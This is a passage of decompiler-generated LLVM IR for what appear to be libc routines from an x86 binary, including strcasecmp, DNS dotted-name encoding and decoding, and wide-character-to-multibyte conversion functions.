  %tmp = icmp ugt i32 %v1_804eedf, %v1_804eee2
  br i1 %tmp, label %dec_label_pc_804eee6, label %dec_label_pc_804eeed

dec_label_pc_804eee6:                             ; preds = %dec_label_pc_804eec6
  store i32 %v1_804eee2, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804eeed

dec_label_pc_804eeed:                             ; preds = %dec_label_pc_804eec6, %dec_label_pc_804eee6
  %v0_804eef2 = phi i32 [ %v1_804eedf, %dec_label_pc_804eec6 ], [ %v1_804eee2, %dec_label_pc_804eee6 ]
  %v1_804eeed = icmp eq i32 %v0_804eef2, 0
  br i1 %v1_804eeed, label %dec_label_pc_804ef09, label %dec_label_pc_804eef1

dec_label_pc_804eef1:                             ; preds = %dec_label_pc_804eeed
  %v0_804eef3 = load i32, i32* @esi, align 4
  %v8_804eef4 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804eef4, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804eef8 = call i32 @memcpy(i16* %tmp45, i32 %v0_804eef3, i32 %v0_804eef2)
  %v1_804ef04 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef04 = add i32 %arg2, -1
  %v3_804ef04 = add i32 %v2_804ef04, %v1_804ef04
  %v4_804ef04 = inttoptr i32 %v3_804ef04 to i8*
  store i8 0, i8* %v4_804ef04, align 1
  br label %dec_label_pc_804ef09

dec_label_pc_804ef09:                             ; preds = %dec_label_pc_804eeed, %dec_label_pc_804eef1
  %v0_804ef09 = load i32, i32* @ebp, align 4
  %v1_804ef09 = icmp eq i32 %v0_804ef09, 0
  br i1 %v1_804ef09, label %dec_label_pc_804ef14, label %dec_label_pc_804ef0d

dec_label_pc_804ef0d:                             ; preds = %dec_label_pc_804ef09
  %v0_804ef0d = load i8*, i8** %stack_var_-108, align 4
  %v1_804ef0d = ptrtoint i8* %v0_804ef0d to i32
  %v2_804ef0d = call i32 @__errno_location(i32 %v1_804ef0d)
  %v0_804ef12 = load i32, i32* @ebp, align 4
  %v2_804ef12 = inttoptr i32 %v2_804ef0d to i32*
  store i32 %v0_804ef12, i32* %v2_804ef12, align 4
  %v0_804ef17.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ef14

dec_label_pc_804ef14:                             ; preds = %dec_label_pc_804ef09, %dec_label_pc_804ef0d
  %v0_804ef17 = phi i32 [ 0, %dec_label_pc_804ef09 ], [ %v0_804ef17.pre, %dec_label_pc_804ef0d ]
  ret i32 %v0_804ef17

; uselistorder directives
  uselistorder i32 %v1_804eee2, { 1, 2, 0 }
  uselistorder i32 %v1_804eedf, { 1, 0, 2 }
  uselistorder i32 %v1_804ee8b, { 0, 2, 1 }
  uselistorder i32 %v3_804ee88, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 34, { 11, 2, 3, 4, 5, 6, 7, 8, 10, 12, 13, 9, 0, 1, 14, 15 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8050c80.124 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804ef14, { 1, 0 }
  uselistorder label %dec_label_pc_804ef09, { 1, 0 }
  uselistorder label %dec_label_pc_804eeed, { 1, 0 }
  uselistorder label %dec_label_pc_804eec6, { 1, 0 }
  uselistorder label %dec_label_pc_804ee85, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ef21 = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v4_804ef2a = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804ef32

dec_label_pc_804ef32:                             ; preds = %dec_label_pc_804ef4f, %entry
  %storemerge = phi i32 [ %v4_804ef2a, %entry ], [ %v1_804ef50, %dec_label_pc_804ef4f ]
  %v0_804ef50 = phi i32 [ %v4_804ef2a, %entry ], [ %v1_804ef50, %dec_label_pc_804ef4f ]
  %v0_804ef556 = phi i32 [ 0, %entry ], [ %v0_804ef557, %dec_label_pc_804ef4f ]
  %v0_804ef4f = phi i32 [ %arg2, %entry ], [ %v1_804ef4f, %dec_label_pc_804ef4f ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804ef32 = icmp eq i32 %v0_804ef50, %v0_804ef4f
  %.pre = inttoptr i32 %v0_804ef50 to i8*
  br i1 %v12_804ef32, label %dec_label_pc_804ef4a, label %dec_label_pc_804ef36

dec_label_pc_804ef36:                             ; preds = %dec_label_pc_804ef32
  %v2_804ef36 = load i8, i8* %.pre, align 1
  %v3_804ef36 = zext i8 %v2_804ef36 to i32
  %v2_804ef39 = mul nuw nsw i32 %v3_804ef36, 2
  %v3_804ef39 = add i32 %v2_804ef39, %v0_804ef21
  %v4_804ef39 = inttoptr i32 %v3_804ef39 to i16*
  %v5_804ef39 = load i16, i16* %v4_804ef39, align 2
  %v6_804ef39 = sext i16 %v5_804ef39 to i32
  %v1_804ef3d = inttoptr i32 %v0_804ef4f to i8*
  %v2_804ef3d = load i8, i8* %v1_804ef3d, align 1
  %v3_804ef3d = zext i8 %v2_804ef3d to i32
  %v2_804ef40 = mul nuw nsw i32 %v3_804ef3d, 2
  %v3_804ef40 = add i32 %v2_804ef40, %v0_804ef21
  %v4_804ef40 = inttoptr i32 %v3_804ef40 to i16*
  %v5_804ef40 = load i16, i16* %v4_804ef40, align 2
  %v6_804ef40 = sext i16 %v5_804ef40 to i32
  %v2_804ef44 = sub nsw i32 %v6_804ef39, %v6_804ef40
  %v12_804ef44 = icmp eq i32 %v2_804ef44, 0
  store i32 %v2_804ef44, i32* @edx, align 4
  %v1_804ef48 = icmp eq i1 %v12_804ef44, false
  br i1 %v1_804ef48, label %dec_label_pc_804ef53, label %dec_label_pc_804ef4a

dec_label_pc_804ef4a:                             ; preds = %dec_label_pc_804ef32, %dec_label_pc_804ef36
  %v0_804ef557 = phi i32 [ %v2_804ef44, %dec_label_pc_804ef36 ], [ %v0_804ef556, %dec_label_pc_804ef32 ]
  %v2_804ef4a = load i8, i8* %.pre, align 1
  %v3_804ef4a = icmp eq i8 %v2_804ef4a, 0
  br i1 %v3_804ef4a, label %dec_label_pc_804ef53, label %dec_label_pc_804ef4f

dec_label_pc_804ef4f:                             ; preds = %dec_label_pc_804ef4a
  %v1_804ef4f = add i32 %v0_804ef4f, 1
  %v1_804ef50 = add i32 %v0_804ef50, 1
  br label %dec_label_pc_804ef32

dec_label_pc_804ef53:                             ; preds = %dec_label_pc_804ef4a, %dec_label_pc_804ef36
  %v0_804ef55 = phi i32 [ %v0_804ef557, %dec_label_pc_804ef4a ], [ %v2_804ef44, %dec_label_pc_804ef36 ]
  ret i32 %v0_804ef55

; uselistorder directives
  uselistorder i32 %v1_804ef50, { 1, 0 }
  uselistorder i32 %v0_804ef557, { 1, 0 }
  uselistorder i32 %v2_804ef44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ef4f, { 1, 2, 0 }
  uselistorder i32 %v0_804ef50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef4a, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804ef59 = load i32, i32* @edi, align 4
  %v0_804ef5a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804ef61 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ef61, i32* @edi, align 4
  %v1_804efc03 = icmp eq i8* %arg1, null
  br i1 %v1_804efc03, label %dec_label_pc_804efc9, label %dec_label_pc_804efc4.lr.ph

dec_label_pc_804efc4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804efc4

dec_label_pc_804ef67:                             ; preds = %dec_label_pc_804efc4
  %v5_804ef6c = call i32 @__GI_strchr(i8* %v1_804efc4, i32 46)
  %v1_804ef74 = icmp eq i32 %v5_804ef6c, 0
  br i1 %v1_804ef74, label %dec_label_pc_804ef80, label %dec_label_pc_804ef7a

dec_label_pc_804ef7a:                             ; preds = %dec_label_pc_804ef67
  %v1_804ef7c = load i32, i32* @edi, align 4
  %v2_804ef7c = sub i32 %v5_804ef6c, %v1_804ef7c
  br label %dec_label_pc_804ef8e

dec_label_pc_804ef80:                             ; preds = %dec_label_pc_804ef67
  %v0_804ef83 = load i32, i32* @edi, align 4
  %v5_804ef83 = inttoptr i32 %v0_804ef83 to i8*
  %v3_804ef84 = call i32 @strlen(i8* %v5_804ef83)
  br label %dec_label_pc_804ef8e

dec_label_pc_804ef8e:                             ; preds = %dec_label_pc_804ef7a, %dec_label_pc_804ef80
  %v0_804efa1 = phi i32 [ %v2_804ef7c, %dec_label_pc_804ef7a ], [ %v3_804ef84, %dec_label_pc_804ef80 ]
  store i32 %v0_804efa1, i32* @esi, align 4
  %v1_804ef8e = icmp eq i32 %v0_804efa1, 0
  %v3_804ef8e = trunc i32 %v0_804efa1 to i8
  br i1 %v1_804ef8e, label %dec_label_pc_804efdd, label %dec_label_pc_804ef92

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ef8e
  %v1_804ef96 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef96 = sub i32 %arg3, %v1_804ef96
  %v1_804ef98 = add i32 %v2_804ef96, -1
  %v7_804ef99 = icmp ult i32 %v0_804efa1, %v1_804ef98
  %v1_804ef9b = icmp eq i1 %v7_804ef99, false
  br i1 %v1_804ef9b, label %dec_label_pc_804efdd, label %dec_label_pc_804ef9d

dec_label_pc_804ef9d:                             ; preds = %dec_label_pc_804ef92
  store i32 %arg2, i32* @edx, align 4
  %v4_804efa3 = add i32 %v1_804ef96, %arg2
  %v5_804efa3 = inttoptr i32 %v4_804efa3 to i8*
  store i8 %v3_804ef8e, i8* %v5_804efa3, align 1
  %v0_804efa6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804efa6 = add i32 %v0_804efa6, 1
  %v0_804efa8 = load i32, i32* @edx, align 4
  %v0_804efaa = load i32, i32* @esi, align 4
  %v2_804efab = add i32 %v1_804efa6, %v0_804efa8
  %v0_804efad = load i32, i32* @edi, align 4
  %v2_804efae = add i32 %v0_804efaa, %v1_804efa6
  store i32 %v2_804efae, i32* %ebx.global-to-local, align 4
  %tmp28 = inttoptr i32 %v2_804efab to i16*
  %v7_804efb1 = call i32 @memcpy(i16* %tmp28, i32 %v0_804efad, i32 %v0_804efaa)
  %v1_804efbd = add i32 %v5_804ef6c, 1
  br i1 %v1_804ef74, label %dec_label_pc_804efc9, label %dec_label_pc_804efc0

dec_label_pc_804efc0:                             ; preds = %dec_label_pc_804ef9d
  store i32 %v1_804efbd, i32* @edi, align 4
  %v1_804efc0 = icmp eq i32 %v1_804efbd, 0
  br i1 %v1_804efc0, label %dec_label_pc_804efc9, label %dec_label_pc_804efc4

dec_label_pc_804efc4:                             ; preds = %dec_label_pc_804efc4.lr.ph, %dec_label_pc_804efc0
  %v0_804ef6b = phi i32 [ %v4_804ef61, %dec_label_pc_804efc4.lr.ph ], [ %v1_804efbd, %dec_label_pc_804efc0 ]
  %v1_804efc4 = inttoptr i32 %v0_804ef6b to i8*
  %v2_804efc4 = load i8, i8* %v1_804efc4, align 1
  %v3_804efc4 = icmp eq i8 %v2_804efc4, 0
  %v1_804efc7 = icmp eq i1 %v3_804efc4, false
  br i1 %v1_804efc7, label %dec_label_pc_804ef67, label %dec_label_pc_804efc9

dec_label_pc_804efc9:                             ; preds = %dec_label_pc_804efc0, %dec_label_pc_804efc4, %dec_label_pc_804ef9d, %entry
  %tmp29 = icmp slt i32 %arg3, 1
  br i1 %tmp29, label %dec_label_pc_804efdd, label %dec_label_pc_804efd0

dec_label_pc_804efd0:                             ; preds = %dec_label_pc_804efc9
  %v1_804efd4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804efd4 = add i32 %v1_804efd4, %arg2
  %v3_804efd4 = inttoptr i32 %v2_804efd4 to i8*
  store i8 0, i8* %v3_804efd4, align 1
  %v0_804efd8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804efd8 = add i32 %v0_804efd8, 1
  br label %dec_label_pc_804efe0

dec_label_pc_804efdd:                             ; preds = %dec_label_pc_804ef92, %dec_label_pc_804ef8e, %dec_label_pc_804efc9
  br label %dec_label_pc_804efe0

dec_label_pc_804efe0:                             ; preds = %dec_label_pc_804efd0, %dec_label_pc_804efdd
  %storemerge1 = phi i32 [ %v1_804efd8, %dec_label_pc_804efd0 ], [ -1, %dec_label_pc_804efdd ]
  store i32 %v0_804ef5a, i32* @esi, align 4
  store i32 %v0_804ef59, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i8* %v1_804efc4, { 1, 0 }
  uselistorder i32 %v1_804efbd, { 0, 2, 1 }
  uselistorder i32 %v0_804efaa, { 1, 0 }
  uselistorder i32 %v5_804ef6c, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 3, 7, 6, 0, 8, 5, 4, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804efe0, { 1, 0 }
  uselistorder label %dec_label_pc_804efdd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804efc9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804efc4, { 1, 0 }
  uselistorder label %dec_label_pc_804ef8e, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_804efea = load i32, i32* @esi, align 4
  %v4_804efef = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_804efef, label %dec_label_pc_804f0b6, label %dec_label_pc_804effe

dec_label_pc_804effe:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_804f09e2541 = add i32 %arg2, %arg1
  %v3_804f09e2642 = inttoptr i32 %v2_804f09e2541 to i8*
  %v4_804f09e2743 = load i8, i8* %v3_804f09e2642, align 1
  %v1_804f0a22945 = icmp eq i8 %v4_804f09e2743, 0
  %v1_804f0a43046 = icmp eq i1 %v1_804f0a22945, false
  br i1 %v1_804f0a43046, label %dec_label_pc_804f00c.lr.ph, label %dec_label_pc_804f0aa

dec_label_pc_804f00c:                             ; preds = %dec_label_pc_804f00c.lr.ph, %dec_label_pc_804f025
  %v0_804f016 = phi i32 [ %v0_804f016.pre, %dec_label_pc_804f00c.lr.ph ], [ %v4_804f036, %dec_label_pc_804f025 ]
  %v8_804f00c37 = phi i1 [ %v8_804f00c3151, %dec_label_pc_804f00c.lr.ph ], [ true, %dec_label_pc_804f025 ]
  %v5_804f09e36.in = phi i8 [ %v5_804f09e2850.in, %dec_label_pc_804f00c.lr.ph ], [ %v4_804f09e, %dec_label_pc_804f025 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_804f00c.lr.ph ], [ 0, %dec_label_pc_804f025 ]
  %v0_804f01334 = phi i32 [ %v0_804f013.ph47, %dec_label_pc_804f00c.lr.ph ], [ %v2_804f044, %dec_label_pc_804f025 ]
  %v5_804f09e36 = zext i8 %v5_804f09e36.in to i32
  %v1_804f013 = add i32 %v0_804f01334, 1
  store i32 %v1_804f013, i32* @esi, align 4
  %v3_804f016 = select i1 %v8_804f00c37, i32 2, i32 1
  %v4_804f016 = add i32 %v3_804f016, %v0_804f016
  store i32 %v4_804f016, i32* %ebp.global-to-local, align 4
  %v1_804f019 = and i32 %v5_804f09e36, 192
  %v6_804f01e = icmp eq i32 %v1_804f019, 192
  %v1_804f023 = icmp eq i1 %v6_804f01e, false
  br i1 %v1_804f023, label %dec_label_pc_804f048, label %dec_label_pc_804f025

dec_label_pc_804f025:                             ; preds = %dec_label_pc_804f00c
  %v2_804f032 = add i32 %v1_804f013, %arg1
  %v3_804f032 = inttoptr i32 %v2_804f032 to i8*
  %v4_804f032 = load i8, i8* %v3_804f032, align 1
  %v5_804f032 = zext i8 %v4_804f032 to i32
  %v4_804f036 = add i32 %v3_804f016, %v4_804f016
  store i32 %v4_804f036, i32* %ebp.global-to-local, align 4
  %v1_804f039 = mul nuw nsw i32 %v5_804f09e36, 256
  %v2_804f03c = and i32 %v1_804f039, 16128
  %v2_804f044 = or i32 %v5_804f032, %v2_804f03c
  store i32 %v2_804f044, i32* @edx, align 4
  store i32 %v1_804f065.ph48, i32* @ecx, align 4
  %v2_804f09e = add i32 %v2_804f044, %arg1
  %v3_804f09e = inttoptr i32 %v2_804f09e to i8*
  %v4_804f09e = load i8, i8* %v3_804f09e, align 1
  %v1_804f0a2 = icmp eq i8 %v4_804f09e, 0
  %v1_804f0a4 = icmp eq i1 %v1_804f0a2, false
  br i1 %v1_804f0a4, label %dec_label_pc_804f00c, label %dec_label_pc_804f0aa

dec_label_pc_804f048:                             ; preds = %dec_label_pc_804f00c
  %v2_804f048 = add i32 %v5_804f09e36, %v1_804f065.ph48
  %v1_804f04d = add i32 %v2_804f048, 1
  store i32 %v1_804f04d, i32* @edi, align 4
  %v10_804f04e = icmp ult i32 %v1_804f04d, %arg4
  %v1_804f056 = icmp eq i1 %v10_804f04e, false
  br i1 %v1_804f056, label %dec_label_pc_804f0b6, label %dec_label_pc_804f058

dec_label_pc_804f058:                             ; preds = %dec_label_pc_804f048
  %v2_804f05e = add i32 %v1_804f013, %arg1
  %v2_804f065 = add i32 %v1_804f065.ph48, %arg3
  %v3_804f068 = inttoptr i32 %v2_804f065 to i16*
  %v4_804f068 = call i32 @memcpy(i16* %v3_804f068, i32 %v2_804f05e, i32 %v5_804f09e36)
  %v0_804f074 = load i32, i32* %ebp.global-to-local, align 4
  %v0_804f07d = load i32, i32* @esi, align 4
  %v2_804f07d = add i32 %v0_804f07d, %v5_804f09e36
  store i32 %v2_804f07d, i32* @edx, align 4
  %v1_804f084 = icmp eq i1 %v8_804f00c37, false
  %v2_804f074 = select i1 %v1_804f084, i32 %v5_804f09e36, i32 0
  %v4_804f084 = add i32 %v0_804f074, %v2_804f074
  store i32 %v4_804f084, i32* %ebp.global-to-local, align 4
  %v4_804f095 = add i32 %v2_804f048, %arg3
  %v5_804f095 = inttoptr i32 %v4_804f095 to i8*
  store i8 46, i8* %v5_804f095, align 1
  %v0_804f098.pre = load i32, i32* @edi, align 4
  %v1_804f09e.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_804f098.pre, i32* @ecx, align 4
  %v2_804f09e25 = add i32 %v1_804f09e.pre.pre, %arg1
  %v3_804f09e26 = inttoptr i32 %v2_804f09e25 to i8*
  %v4_804f09e27 = load i8, i8* %v3_804f09e26, align 1
  %v1_804f0a229 = icmp eq i8 %v4_804f09e27, 0
  %v1_804f0a430 = icmp eq i1 %v1_804f0a229, false
  %v8_804f00c31 = icmp eq i8 %stack_var_-17.135, 0
  %v0_804f016.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_804f0a430, label %dec_label_pc_804f00c.lr.ph, label %dec_label_pc_804f0aa

dec_label_pc_804f00c.lr.ph:                       ; preds = %dec_label_pc_804f058, %dec_label_pc_804effe
  %v0_804f016.pre = phi i32 [ 0, %dec_label_pc_804effe ], [ %v0_804f016.pre.pre, %dec_label_pc_804f058 ]
  %v8_804f00c3151 = phi i1 [ false, %dec_label_pc_804effe ], [ %v8_804f00c31, %dec_label_pc_804f058 ]
  %v5_804f09e2850.in = phi i8 [ %v4_804f09e2743, %dec_label_pc_804effe ], [ %v4_804f09e27, %dec_label_pc_804f058 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_804effe ], [ %stack_var_-17.135, %dec_label_pc_804f058 ]
  %v1_804f065.ph48 = phi i32 [ 0, %dec_label_pc_804effe ], [ %v0_804f098.pre, %dec_label_pc_804f058 ]
  %v0_804f013.ph47 = phi i32 [ %arg2, %dec_label_pc_804effe ], [ %v1_804f09e.pre.pre, %dec_label_pc_804f058 ]
  br label %dec_label_pc_804f00c

dec_label_pc_804f0aa:                             ; preds = %dec_label_pc_804f058, %dec_label_pc_804f025, %dec_label_pc_804effe
  %v0_804f0af = phi i32 [ 0, %dec_label_pc_804effe ], [ %v4_804f036, %dec_label_pc_804f025 ], [ %v0_804f016.pre.pre, %dec_label_pc_804f058 ]
  %v8_804f00c.lcssa = phi i1 [ false, %dec_label_pc_804effe ], [ true, %dec_label_pc_804f025 ], [ %v8_804f00c31, %dec_label_pc_804f058 ]
  %v2_804f0b1 = zext i1 %v8_804f00c.lcssa to i32
  %v3_804f0b1 = add i32 %v0_804f0af, 1
  %v4_804f0b1 = add i32 %v3_804f0b1, %v2_804f0b1
  br label %dec_label_pc_804f0b9

dec_label_pc_804f0b6:                             ; preds = %dec_label_pc_804f048, %entry
  br label %dec_label_pc_804f0b9

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f0aa, %dec_label_pc_804f0b6
  %storemerge = phi i32 [ %v4_804f0b1, %dec_label_pc_804f0aa ], [ -1, %dec_label_pc_804f0b6 ]
  store i32 %v0_804efea, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f065.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_804f09e, { 1, 0 }
  uselistorder i32 %v2_804f044, { 0, 2, 1 }
  uselistorder i32 %v4_804f036, { 0, 2, 1 }
  uselistorder i32 %v5_804f09e36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 5, 6, 8, 3, 0, 7, 1, 4 }
  uselistorder i8 46, { 4, 0, 5, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_804f0b9, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804f0d2 = icmp eq i32 %arg1, 0
  br i1 %v1_804f0d2, label %dec_label_pc_804f101, label %dec_label_pc_804f0f2.preheader

dec_label_pc_804f0f2.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_804f0f210 = add i32 %arg2, %arg1
  %v3_804f0f211 = inttoptr i32 %v2_804f0f210 to i8*
  %v4_804f0f212 = load i8, i8* %v3_804f0f211, align 1
  %v1_804f0f614 = add i32 %arg2, 1
  %v1_804f0f915 = icmp eq i8 %v4_804f0f212, 0
  %v1_804f0fb16 = icmp eq i1 %v1_804f0f915, false
  br i1 %v1_804f0fb16, label %dec_label_pc_804f0e1, label %dec_label_pc_804f0fd

dec_label_pc_804f0d8:                             ; preds = %dec_label_pc_804f0e1
  %v1_804f0d8 = add i32 %v0_804f0d817, 2
  br label %dec_label_pc_804f0fd

dec_label_pc_804f0e1:                             ; preds = %dec_label_pc_804f0f2.preheader, %dec_label_pc_804f0f2
  %v1_804f0f619 = phi i32 [ %v1_804f0f6, %dec_label_pc_804f0f2 ], [ %v1_804f0f614, %dec_label_pc_804f0f2.preheader ]
  %v5_804f0f218.in = phi i8 [ %v4_804f0f2, %dec_label_pc_804f0f2 ], [ %v4_804f0f212, %dec_label_pc_804f0f2.preheader ]
  %v0_804f0d817 = phi i32 [ %v2_804f0ef, %dec_label_pc_804f0f2 ], [ %arg2, %dec_label_pc_804f0f2.preheader ]
  %v5_804f0f218 = zext i8 %v5_804f0f218.in to i32
  %v1_804f0e3 = and i32 %v5_804f0f218, 192
  %v6_804f0e8 = icmp eq i32 %v1_804f0e3, 192
  %v2_804f0ef = add i32 %v5_804f0f218, %v1_804f0f619
  br i1 %v6_804f0e8, label %dec_label_pc_804f0d8, label %dec_label_pc_804f0f2

dec_label_pc_804f0f2:                             ; preds = %dec_label_pc_804f0e1
  store i32 %v2_804f0ef, i32* @ecx, align 4
  %v2_804f0f2 = add i32 %v2_804f0ef, %arg1
  %v3_804f0f2 = inttoptr i32 %v2_804f0f2 to i8*
  %v4_804f0f2 = load i8, i8* %v3_804f0f2, align 1
  %v1_804f0f6 = add i32 %v2_804f0ef, 1
  %v1_804f0f9 = icmp eq i8 %v4_804f0f2, 0
  %v1_804f0fb = icmp eq i1 %v1_804f0f9, false
  br i1 %v1_804f0fb, label %dec_label_pc_804f0e1, label %dec_label_pc_804f0fd

dec_label_pc_804f0fd:                             ; preds = %dec_label_pc_804f0f2.preheader, %dec_label_pc_804f0f2, %dec_label_pc_804f0d8
  %v0_804f0fd = phi i32 [ %v1_804f0d8, %dec_label_pc_804f0d8 ], [ %v1_804f0f614, %dec_label_pc_804f0f2.preheader ], [ %v1_804f0f6, %dec_label_pc_804f0f2 ]
  %v2_804f0ff = sub i32 %v0_804f0fd, %arg2
  br label %dec_label_pc_804f101

dec_label_pc_804f101:                             ; preds = %entry, %dec_label_pc_804f0fd
  %v0_804f104 = phi i32 [ -1, %entry ], [ %v2_804f0ff, %dec_label_pc_804f0fd ]
  ret i32 %v0_804f104

; uselistorder directives
  uselistorder i8 %v4_804f0f2, { 1, 0 }
  uselistorder i32 %v2_804f0ef, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f101, { 1, 0 }
  uselistorder label %dec_label_pc_804f0fd, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f0e1, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804f113 = icmp eq i32 %tmp4, 0
  %v1_804f115 = icmp eq i1 %v1_804f113, false
  br i1 %v1_804f115, label %dec_label_pc_804f11d, label %dec_label_pc_804f117

dec_label_pc_804f117:                             ; preds = %entry
  %v2_804f117 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804f11d

dec_label_pc_804f11d:                             ; preds = %entry, %dec_label_pc_804f117
  %v0_804f139 = phi i32 [ %tmp4, %entry ], [ %v2_804f117, %dec_label_pc_804f117 ]
  %v0_804f125 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_804f117 ]
  %v2_804f11d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804f11d, i32* %stack_var_-8, align 4
  store i32 %v0_804f125, i32* %stack_var_-4, align 4
  %v2_804f134 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804f13a = inttoptr i32 %v0_804f139 to i8*
  %v6_804f13a = call i32 @__GI_wcsnrtombs(i8* %v5_804f13a, i32 %v2_804f134, i32 1, i32 16, i32 %tmp)
  %v1_804f144 = icmp eq i32 %v6_804f13a, 0
  %v3_804f146 = select i1 %v1_804f144, i32 1, i32 %v6_804f13a
  ret i32 %v3_804f146

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804f11d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804f165 = inttoptr i32 %tmp to i8*
  %v6_804f165 = call i32 @__GI_wcsnrtombs(i8* %v5_804f165, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804f165
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_804f173 = load i32, i32* @ebx, align 4
  %v4_804f177 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f177, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804f187 = icmp eq i8* %arg1, null
  store i1 %v1_804f187, i1* %zf.global-to-local, align 1
  br i1 %v1_804f187, label %dec_label_pc_804f196, label %dec_label_pc_804f18b

dec_label_pc_804f18b:                             ; preds = %entry
  %v12_804f18b = icmp eq i32 %v4_804f177, %arg2
  store i1 %v12_804f18b, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804f192 = icmp eq i1 %v12_804f18b, false
  br i1 %v1_804f192, label %dec_label_pc_804f1b9, label %dec_label_pc_804f1b3

dec_label_pc_804f196:                             ; preds = %entry
  %v2_804f196 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f196, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804f1b7

dec_label_pc_804f19f:                             ; preds = %dec_label_pc_804f1c7
